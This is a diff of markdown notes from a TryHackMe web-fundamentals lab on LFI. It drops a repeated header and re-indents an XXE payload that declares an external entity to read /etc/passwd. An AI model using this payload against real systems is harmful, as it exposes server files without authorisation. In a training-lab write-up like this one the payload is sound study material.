@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-01-16-tryhackme-web-fundame
 author: 100007
 ---
 
-# TryHackMe: Web Fundamentals
-
-**author:** Nathan Acks  
-**date:** 2022-01-16
-
 # LFI
 
 ## Deploy
@@ -131,8 +126,8 @@ Confirming that a garbage DOCTYPE/ELEMENT definition are fine, the following app
 
 ```
 <!DOCTYPE test [
-<!ELEMENT test ANY>
-<!ENTITY test SYSTEM "file:///etc/passwd">
+	<!ELEMENT test ANY>
+	<!ENTITY test SYSTEM "file:///etc/passwd">
 ]>
 ```
 
